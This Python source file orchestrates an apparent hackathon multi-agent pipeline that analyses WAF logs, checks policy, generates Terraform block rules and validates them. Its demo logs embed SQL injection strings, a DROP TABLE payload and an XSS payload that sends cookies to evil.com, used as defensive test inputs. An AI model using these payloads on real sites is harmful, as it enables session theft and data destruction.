"""
CloudGuard AI - State Manager / Orchestrator
----------------------------------------------
The central nervous system of CloudGuard AI. Runs the complete 4-stage
event-driven incident response pipeline, coordinating all agents through
the Band API state machine.

Pipeline Flow:
    Raw Log
      ↓
    [Stage 1] ThreatHunterAgent → PUSH "FORENSICS" → Band API
      ↓
    [Stage 2] PolicyCheckerAgent ← (receives forensics) → PUSH "POLICY_CHECK" → Band API
      ↓  [HALT if policy_check == FAILED]
    [Stage 3] CloudOpsRunnerAgent ← (receives policy) → PUSH "IAC_GENERATION" → Band API
      ↓
    [Stage 4] ValidatorAgent ← (receives IaC) → PUSH "VALIDATION" → Band API
      ↓
    Final Report

Run directly:
    python -m band_layer.state_manager
"""

import json
import logging
import os

# FIX FOR WINDOWS CRASH: Prevent OpenBLAS Memory Allocation Error
os.environ["OPENBLAS_NUM_THREADS"] = "1"
os.environ["OMP_NUM_THREADS"] = "1"

import re
import sys
import time
from datetime import datetime, timezone
from typing import Optional

from dotenv import load_dotenv

from core_agents.threat_hunter import ThreatHunterAgent
from core_agents.policy_checker import PolicyCheckerAgent
from core_agents.cloud_ops_runner import CloudOpsRunnerAgent
from core_agents.validator import ValidatorAgent
from core_agents.base_agent import extract_json
from band_layer.band_client import BandClient, BandAPIError

load_dotenv()




# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("CloudGuardOrchestrator")

# ANSI color codes for terminal output
_RED = "\033[91m"
_GREEN = "\033[92m"
_YELLOW = "\033[93m"
_CYAN = "\033[96m"
_BOLD = "\033[1m"
_RESET = "\033[0m"


def _banner(text: str, color: str = _CYAN) -> None:
    """Prints a formatted section banner to stdout."""
    width = 70
    border = "═" * width
    print(f"\n{color}{_BOLD}╔{border}╗")
    print(f"║  {text:<{width - 2}}║")
    print(f"╚{border}╝{_RESET}")


def _step(icon: str, text: str, color: str = _CYAN) -> None:
    """Prints a formatted step indicator."""
    print(f"{color}{_BOLD}{icon}{_RESET} {text}")


class PipelineResult:
    """
    Container for the complete CloudGuard pipeline execution result.
    Captures outputs from each stage and the final status.
    """

    def __init__(self, raw_log: str):
        self.raw_log = raw_log
        self.started_at = datetime.now(timezone.utc).isoformat()
        self.completed_at: Optional[str] = None
        self.pipeline_status: str = "PENDING"  # PENDING | COMPLETED | HALTED | FAILED

        # Stage outputs
        self.forensics: Optional[dict] = None
        self.policy: Optional[dict] = None
        self.iac: Optional[dict] = None
        self.validation: Optional[dict] = None

        # Error tracking
        self.error: Optional[str] = None
        self.halt_reason: Optional[str] = None

    def to_dict(self) -> dict:
        return {
            "pipeline_status": self.pipeline_status,
            "started_at": self.started_at,
            "completed_at": self.completed_at,
            "raw_log_preview": self.raw_log[:100] + "..." if len(self.raw_log) > 100 else self.raw_log,
            "stages": {
                "1_forensics": self.forensics,
                "2_policy_check": self.policy,
                "3_iac_generation": self.iac,
                "4_validation": self.validation,
            },
            "halt_reason": self.halt_reason,
            "error": self.error,
        }

    def __repr__(self) -> str:
        return json.dumps(self.to_dict(), indent=2)


class CloudGuardOrchestrator:
    """
    Event-driven orchestrator for the CloudGuard AI incident response pipeline.

    Coordinates 4 specialized CrewAI agents through the Band API state machine.
    Each agent's output is immediately pushed to the Band API before the next
    agent is invoked, ensuring a complete, real-time audit trail.

    Agents communicate ONLY through this orchestrator — they never call each
    other directly, maintaining strict separation of concerns.
    """

    def __init__(self):
        _banner("CloudGuard AI — Initializing Orchestrator", _CYAN)

        _step("🤖", "Loading AI Agents...")
        self.threat_hunter = ThreatHunterAgent()
        _step("  ✓", "ThreatHunterAgent ready", _GREEN)

        self.policy_checker = PolicyCheckerAgent()
        _step("  ✓", "PolicyCheckerAgent ready", _GREEN)

        self.cloud_ops_runner = CloudOpsRunnerAgent()
        _step("  ✓", "CloudOpsRunnerAgent ready", _GREEN)

        self.validator = ValidatorAgent()
        _step("  ✓", "ValidatorAgent ready", _GREEN)

        _step("🌐", "Connecting to Band API Hub...")
        try:
            self.band_client = BandClient()
            _step("  ✓", "Band API connection established", _GREEN)
        except (BandAPIError, EnvironmentError) as exc:
            _step("  ⚠", f"Band API unavailable: {exc}", _YELLOW)
            _step("  ⚠", "Running in offline mode — pipeline will execute without live Band sync.", _YELLOW)
            self.band_client = None

        print(f"\n{_GREEN}{_BOLD}[+] CloudGuard Orchestrator is READY.{_RESET}")

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    def _push_to_band(self, state: str, payload: dict) -> None:
        """
        Pushes a payload to the Band API. Handles the case where Band is offline.
        Dynamically switches API keys to impersonate the distinct agents on the Band UI.

        Args:
            state: Pipeline state name (e.g., "FORENSICS").
            payload: The agent's structured output dict.
        """
        client = self.band_client
        
        # Route to Threat Hunter identity
        if state == "FORENSICS":
            th_key = os.getenv("BAND_THREAT_HUNTER_KEY")
            th_id = os.getenv("BAND_THREAT_HUNTER_AGENT_ID")
            if th_key and th_id:
                if not hasattr(self, "band_threat_hunter"):
                    self.band_threat_hunter = BandClient(api_key=th_key, agent_id=th_id)
                client = self.band_threat_hunter
                
        # Route to CloudOps Engineer identity
        elif state == "IAC_GENERATION":
            co_key = os.getenv("BAND_CLOUDOPS_KEY")
            co_id = os.getenv("BAND_CLOUDOPS_AGENT_ID")
            if co_key and co_id:
                if not hasattr(self, "band_cloudops"):
                    self.band_cloudops = BandClient(api_key=co_key, agent_id=co_id)
                client = self.band_cloudops

        if client:
            client.push(state=state, payload=payload)
        else:
            logger.warning("[Offline] Band push skipped for state=%s", state)
            print(
                f"  {_YELLOW}[Offline Mode]{_RESET} "
                f"Band push skipped for state={state}. "
                f"Payload:\n  {json.dumps(payload)[:200]}"
            )

    @staticmethod
    def _safe_parse_json(raw_output) -> dict:
        """
        Safely converts CrewAI output to a Python dict.
        Delegates to the shared extract_json utility from core_agents.base_agent.

        Args:
            raw_output: Output from a CrewAI agent run — dict, str, or CrewOutput.

        Returns:
            Parsed dict, or a fallback dict wrapping the raw string on failure.
        """
        try:
            return extract_json(raw_output)
        except (ValueError, Exception) as exc:
            raw_text = raw_output.raw if hasattr(raw_output, "raw") else str(raw_output)
            logger.error("Could not extract JSON from output: %s | Error: %s", raw_text[:300], exc)
            return {"raw_output": raw_text, "_parse_error": True}

    # ------------------------------------------------------------------
    # Public interface
    # ------------------------------------------------------------------

    def run_incident_response(self, raw_log_payload: str) -> PipelineResult:
        """
        Executes the complete CloudGuard incident response pipeline.

        The pipeline is fully sequential:
        1. ThreatHunter parses the raw log → PUSH to Band
        2. PolicyChecker evaluates forensics → PUSH to Band
        3. [CONDITIONAL] If policy PASSED → CloudOpsRunner generates Terraform → PUSH to Band
        4. [CONDITIONAL] Validator audits IaC → PUSH to Band

        All inter-stage data flows through in-memory dicts (not re-pulled from Band)
        to maintain execution speed during the hackathon. Band is used as a
        write-ahead audit log and for real-time UI visibility.

        Args:
            raw_log_payload: Raw, unstructured security log string to investigate.

        Returns:
            PipelineResult containing all stage outputs and final status.
        """
        # ── INPUT VALIDATION ──────────────────────────────────────────────────
        MAX_LOG_CHARS = 4000
        if len(raw_log_payload) > MAX_LOG_CHARS:
            logger.warning(
                "Input log truncated from %d to %d chars (prompt injection guard).",
                len(raw_log_payload), MAX_LOG_CHARS,
            )
            raw_log_payload = raw_log_payload[:MAX_LOG_CHARS]

        result = PipelineResult(raw_log_payload)
        _banner("CloudGuard AI — Incident Response Pipeline Started", _BOLD)

        # ── STAGE 1: FORENSICS ────────────────────────────────────────────────
        try:
            _banner("Stage 1 / 4 — FORENSICS: ThreatHunter", _CYAN)
            _step("🔍", "Running ThreatHunterAgent...")

            raw_forensics = self.threat_hunter.run(raw_log_payload)
            forensics = self._safe_parse_json(raw_forensics)

            if forensics.get("_parse_error"):
                raise ValueError(f"ThreatHunter output is not valid JSON: {forensics.get('raw_output', '')[:300]}")

            result.forensics = forensics
            _step("  ✓", f"Forensics complete: {json.dumps(forensics)[:150]}", _GREEN)

            self._push_to_band("FORENSICS", forensics)

        except Exception as exc:
            result.pipeline_status = "FAILED"
            result.error = f"Stage 1 (FORENSICS) failed: {exc}"
            result.completed_at = datetime.now(timezone.utc).isoformat()
            logger.exception("Stage 1 failed")
            _step("✗", f"FORENSICS FAILED: {exc}", _RED)
            self._print_final_report(result)
            return result

        # ── STAGE 2: POLICY CHECK ─────────────────────────────────────────────
        try:
            _banner("Stage 2 / 4 — POLICY CHECK: PolicyChecker", _CYAN)
            _step("🛡️", "Running PolicyCheckerAgent...")

            raw_policy = self.policy_checker.run(forensics)
            policy = self._safe_parse_json(raw_policy)

            if policy.get("_parse_error"):
                raise ValueError(f"PolicyChecker output is not valid JSON: {policy.get('raw_output', '')[:300]}")

            result.policy = policy
            policy_status = policy.get("policy_check", "UNKNOWN").upper()
            _step("  ✓", f"Policy decision: {policy_status} — {policy.get('recommended_action', 'N/A')}", _GREEN)

            self._push_to_band("POLICY_CHECK", policy)

        except Exception as exc:
            result.pipeline_status = "FAILED"
            result.error = f"Stage 2 (POLICY_CHECK) failed: {exc}"
            result.completed_at = datetime.now(timezone.utc).isoformat()
            logger.exception("Stage 2 failed")
            _step("✗", f"POLICY CHECK FAILED: {exc}", _RED)
            self._print_final_report(result)
            return result

        # ── POLICY GATE ───────────────────────────────────────────────────────
        policy_check = (result.policy or {}).get("policy_check", "").upper()
        if policy_check != "PASSED":
            halt_msg = (
                f"Policy check returned '{policy_check}'. "
                f"Reason: {result.policy.get('policy_reasoning', 'N/A')}. "
                f"Recommended action: {result.policy.get('recommended_action', 'N/A')}."
            )
            _step("\n⛔", f"PIPELINE HALTED — {halt_msg}", _YELLOW)
            result.pipeline_status = "HALTED"
            result.halt_reason = halt_msg
            result.completed_at = datetime.now(timezone.utc).isoformat()
            self._print_final_report(result)
            return result

        _step("  ✓", "Policy PASSED — proceeding to IaC generation.", _GREEN)

        # ── STAGE 3: IAC GENERATION ───────────────────────────────────────────
        try:
            _banner("Stage 3 / 4 — IAC GENERATION: CloudOpsRunner", _CYAN)
            _step("⚙️", "Running CloudOpsRunnerAgent...")

            # Merge forensics into policy dict so CloudOpsRunner has incident_id + source_ips
            combined_context = {**result.forensics, **result.policy}
            raw_iac = self.cloud_ops_runner.run(combined_context)
            iac = self._safe_parse_json(raw_iac)

            if iac.get("_parse_error"):
                raise ValueError(f"CloudOpsRunner output is not valid JSON: {iac.get('raw_output', '')[:300]}")

            result.iac = iac
            _step("  ✓", f"Terraform generated — targets: {iac.get('target_ips', 'N/A')}", _GREEN)

            self._push_to_band("IAC_GENERATION", iac)

        except Exception as exc:
            result.pipeline_status = "FAILED"
            result.error = f"Stage 3 (IAC_GENERATION) failed: {exc}"
            result.completed_at = datetime.now(timezone.utc).isoformat()
            logger.exception("Stage 3 failed")
            _step("✗", f"IAC GENERATION FAILED: {exc}", _RED)
            self._print_final_report(result)
            return result

        # ── STAGE 4: VALIDATION ───────────────────────────────────────────────
        try:
            _banner("Stage 4 / 4 — VALIDATION: Validator", _CYAN)
            _step("🔎", "Running ValidatorAgent...")

            raw_validation = self.validator.run(result.iac)
            validation = self._safe_parse_json(raw_validation)

            if validation.get("_parse_error"):
                raise ValueError(f"Validator output is not valid JSON: {validation.get('raw_output', '')[:300]}")

            result.validation = validation
            validation_status = validation.get("validation_status", "UNKNOWN")
            _step("  ✓", f"Validation: {validation_status} — warnings: {validation.get('security_warnings', 'None')}", _GREEN)

            self._push_to_band("VALIDATION", validation)

        except Exception as exc:
            result.pipeline_status = "FAILED"
            result.error = f"Stage 4 (VALIDATION) failed: {exc}"
            result.completed_at = datetime.now(timezone.utc).isoformat()
            logger.exception("Stage 4 failed")
            _step("✗", f"VALIDATION FAILED: {exc}", _RED)
            self._print_final_report(result)
            return result

        # ── FINAL STATUS ──────────────────────────────────────────────────────
        validation_status = (result.validation or {}).get("validation_status", "")
        if validation_status == "BLOCKED_UNSAFE_CODE":
            result.pipeline_status = "HALTED"
            result.halt_reason = (
                f"Validator blocked deployment: {result.validation.get('security_warnings', 'Unknown risk')}"
            )
            _step("\n⛔", f"DEPLOYMENT BLOCKED — {result.halt_reason}", _RED)
        else:
            result.pipeline_status = "COMPLETED"
            _step("\n🚀", "Pipeline completed. IaC is SAFE TO DEPLOY.", _GREEN)

        result.completed_at = datetime.now(timezone.utc).isoformat()
        self._print_final_report(result)
        return result

    @staticmethod
    def _print_final_report(result: PipelineResult) -> None:
        """Prints a structured final report to stdout."""
        status_colors = {
            "COMPLETED": _GREEN,
            "HALTED": _YELLOW,
            "FAILED": _RED,
            "PENDING": _CYAN,
        }
        color = status_colors.get(result.pipeline_status, _CYAN)
        _banner(
            f"CloudGuard AI — Pipeline {result.pipeline_status}",
            color,
        )
        print(f"\n{_BOLD}Final Pipeline Report:{_RESET}")
        print(json.dumps(result.to_dict(), indent=2))


# ── Entry Point ───────────────────────────────────────────────────────────────

def _get_sample_logs() -> list[str]:
    """Returns a set of realistic WAF log samples for demo/testing."""
    return [
        # SQLi attack from external IP
        (
            "2026-06-14T10:33:17Z WAF BLOCK action=BLOCK clientIP=198.51.100.23 "
            "uri=/api/users/login args=username=admin'+OR+'1'='1';-- httpMethod=POST "
            "ruleId=SQLi-002 ruleGroup=AWSManagedRulesSQLiRuleSet statusCode=403"
        ),
        # XSS from external IP
        (
            "2026-06-14T11:45:02Z WAF BLOCK action=BLOCK clientIP=203.0.113.77 "
            "uri=/search args=q=<script>document.location='http://evil.com/?c='+document.cookie</script> "
            "httpMethod=GET ruleId=XSS-001 ruleGroup=AWSManagedRulesCommonRuleSet statusCode=403"
        ),
        # Internal IP (should be rejected by policy)
        (
            "2026-06-14T12:00:00Z WAF ALLOW action=ALLOW clientIP=10.0.1.45 "
            "uri=/internal/health httpMethod=GET statusCode=200"
        ),
    ]


if __name__ == "__main__":
    print(f"\n{_BOLD}{_CYAN}{'='*72}")
    print("  CloudGuard AI — Band of Agents Hackathon Demo")
    print("  lablab.ai | Event-Driven Multi-Agent Cloud Security System")
    print(f"{'='*72}{_RESET}\n")

    # ── CLI override: single custom log ───────────────────────────────────────
    if len(sys.argv) > 1:
        custom_log = " ".join(sys.argv[1:])
        print(f"{_YELLOW}[*] CLI Mode — Processing custom log:{_RESET}")
        print(f"   {custom_log}\n")
        orchestrator = CloudGuardOrchestrator()
        result = orchestrator.run_incident_response(custom_log)
        if result.pipeline_status == "FAILED":
            sys.exit(1)
        sys.exit(0)

    # ── Demo Mode: run all 3 QA scenarios sequentially ────────────────────────
    DEMO_SCENARIOS = [
        {
            "label": "Scenario A — HIGH THREAT (External SQLi → Full Mitigation)",
            "expected": "COMPLETED  |  WAF IP block generated and validated",
            "log": (
                "2026-06-14T10:33:17Z WAF BLOCK action=BLOCK clientIP=198.51.100.23 "
                "uri=/api/users/login "
                "args=username=admin'+OR+'1'='1';-- httpMethod=POST "
                "ruleId=SQLi-002 ruleGroup=AWSManagedRulesSQLiRuleSet statusCode=403"
            ),
        },
        {
            "label": "Scenario B — POLICY HALT (Internal IP → Mitigation Rejected)",
            "expected": "HALTED     |  Policy rejects internal RFC1918 source IP — no WAF rule generated",
            "log": (
                "2026-06-14T12:15:42Z WAF BLOCK action=BLOCK clientIP=10.0.0.15 "
                "uri=/admin/users/delete args=id=1;DROP+TABLE+users-- httpMethod=POST "
                "ruleId=SQLi-007 ruleGroup=AWSManagedRulesSQLiRuleSet statusCode=403"
            ),
        },
        {
            "label": "Scenario C — LOW THREAT (Benign Traffic → No Action Required)",
            "expected": "HALTED     |  Low-severity benign traffic, policy denies mitigation → NO_ACTION_REQUIRED",
            "log": (
                "2026-06-14T13:45:00Z WAF ALLOW action=ALLOW clientIP=203.0.113.99 "
                "uri=/robots.txt httpMethod=GET statusCode=200 "
                "ruleId=NONE ruleGroup=NONE bytes=512"
            ),
        },
    ]

    # Instantiate orchestrator once — reused across all scenarios
    orchestrator = CloudGuardOrchestrator()

    scenario_results: list[dict] = []

    for idx, scenario in enumerate(DEMO_SCENARIOS, start=1):
        print(f"\n{_BOLD}{_YELLOW}{'─'*72}")
        print(f"  [{idx}/3] {scenario['label']}")
        print(f"  Expected: {scenario['expected']}")
        print(f"{'─'*72}{_RESET}\n")
        print(f"{_YELLOW}[*] Log Input:{_RESET}")
        print(f"   {scenario['log']}\n")

        result = orchestrator.run_incident_response(scenario["log"])

        scenario_results.append({
            "label": scenario["label"],
            "expected": scenario["expected"],
            "status": result.pipeline_status,
            "halt_reason": result.halt_reason or "—",
            "error": result.error or "—",
            "forensics": result.forensics or {},
            "policy": result.policy or {},
            "validation": result.validation or {},
        })

    # ── Consolidated Demo Summary ──────────────────────────────────────────────
    print(f"\n{_BOLD}{_CYAN}{'='*72}")
    print("  CloudGuard AI — QA Demo Summary")
    print(f"{'='*72}{_RESET}")

    all_passed = True
    for idx, r in enumerate(scenario_results, start=1):
        status = r["status"]
        color = _GREEN if status != "FAILED" else _RED
        icon  = "✅" if status != "FAILED" else "❌"

        forensics = r["forensics"]
        policy    = r["policy"]
        validation = r["validation"]

        print(f"\n{color}{_BOLD}{icon}  [{idx}/3] {r['label']}{_RESET}")
        print(f"    Pipeline Status   : {color}{status}{_RESET}")
        print(f"    Expected Outcome  : {r['expected']}")
        if forensics:
            print(f"    Threat Detected   : {forensics.get('attack_type','—')}  "
                  f"| Severity: {forensics.get('severity','—')}  "
                  f"| Source IPs: {forensics.get('source_ips','—')}")
        if policy:
            print(f"    Policy Decision   : {policy.get('policy_check','—')}  "
                  f"→  {policy.get('recommended_action','—')}")
            print(f"    Policy Reasoning  : {policy.get('policy_reasoning','—')}")
        if status == "HALTED":
            print(f"    Halt Reason       : {r['halt_reason']}")
        if validation:
            print(f"    Validation        : {validation.get('validation_status','—')}  "
                  f"| Warnings: {validation.get('security_warnings','None')}")
        if status == "FAILED":
            print(f"    {_RED}Error: {r['error']}{_RESET}")
            all_passed = False

    print(f"\n{_BOLD}{'─'*72}{_RESET}")
    if all_passed:
        print(f"{_GREEN}{_BOLD}✅  ALL SCENARIOS PASSED — CloudGuard AI is hackathon-ready!{_RESET}")
    else:
        print(f"{_RED}{_BOLD}❌  ONE OR MORE SCENARIOS FAILED — review logs above.{_RESET}")
    print(f"{_BOLD}{'─'*72}{_RESET}\n")

    # Exit 1 only on hard FAILED scenarios (HALTED and COMPLETED are both valid outcomes)
    if any(r["status"] == "FAILED" for r in scenario_results):
        sys.exit(1)


# ── Frontend Integration Point ────────────────────────────────────────────────
def run_pipeline(callback):
    """
    Integration point for the Flask frontend.
    Runs all three QA scenarios sequentially and pushes real-time
    updates to the UI via the provided SocketIO callback.

    Scenarios:
        A — High Threat  (External SQLi → Full Mitigation)
        B — Policy Halt  (Internal IP  → Rejected)
        C — Low Threat   (Benign probe → No Action)
    """
    import time as _time
    import json as _json

    # ── Reuse the exact scenario payloads from the CLI demo ───────────────────
    SCENARIOS = [
        {
            "label": "Scenario A — HIGH THREAT (External SQLi → Full Mitigation)",
            "log": (
                "2026-06-14T10:33:17Z WAF BLOCK action=BLOCK clientIP=198.51.100.23 "
                "uri=/api/users/login "
                "args=username=admin'+OR+'1'='1';-- httpMethod=POST "
                "ruleId=SQLi-002 ruleGroup=AWSManagedRulesSQLiRuleSet statusCode=403"
            ),
        },
        {
            "label": "Scenario B — POLICY HALT (Internal IP → Mitigation Rejected)",
            "log": (
                "2026-06-14T12:15:42Z WAF BLOCK action=BLOCK clientIP=10.0.0.15 "
                "uri=/admin/users/delete args=id=1;DROP+TABLE+users-- httpMethod=POST "
                "ruleId=SQLi-007 ruleGroup=AWSManagedRulesSQLiRuleSet statusCode=403"
            ),
        },
        {
            "label": "Scenario C — LOW THREAT (Benign Traffic → No Action Required)",
            "log": (
                "2026-06-14T13:45:00Z WAF ALLOW action=ALLOW clientIP=203.0.113.99 "
                "uri=/robots.txt httpMethod=GET statusCode=200 "
                "ruleId=NONE ruleGroup=NONE bytes=512"
            ),
        },
    ]

    # ── Patch _step to forward agent activity to the frontend callback ─────────
    global _step
    original_step = _step

    def patched_step(icon, text, color=""):
        original_step(icon, text, color)
        if "Terraform generated" in text:
            callback({"type": "timeline", "status": f"<b>CloudOps:</b> {text}"})
        elif "Pipeline completed" in text or "PIPELINE HALTED" in text:
            callback({"type": "timeline", "status": f"<b>Orchestrator:</b> {text}"})
        else:
            callback({"type": "timeline", "status": f"<b>Agent Activity:</b> {text}"})

    import band_layer.state_manager as sm
    sm._step = patched_step

    try:
        orchestrator = CloudGuardOrchestrator()

        for idx, scenario in enumerate(SCENARIOS, start=1):
            # ── Announce scenario start to the frontend ────────────────────────
            callback({
                "type": "timeline",
                "status": (
                    f"<b>─── [{idx}/3] {scenario['label']} ───</b>"
                ),
            })

            result = orchestrator.run_incident_response(scenario["log"])

            # ── Push remediation code if IaC was generated (Scenario A only) ──
            if result.iac:
                callback({
                    "type": "remediation",
                    "code": _json.dumps(result.iac, indent=2),
                    "status": "<b>DevOps-Shield Agent:</b> Terraform isolation script generated successfully.",
                })

            # ── Push final scenario outcome as a timeline entry ────────────────
            status_icon = "✅" if result.pipeline_status == "COMPLETED" else "⛔"
            callback({
                "type": "timeline",
                "status": (
                    f"<b>{status_icon} {scenario['label']}:</b> "
                    f"{result.pipeline_status}"
                    + (f" — {result.halt_reason}" if result.halt_reason else "")
                ),
            })

            # ── 5-second pause between scenarios for frontend rendering ────────
            if idx < len(SCENARIOS):
                _time.sleep(5)

    finally:
        sm._step = original_step


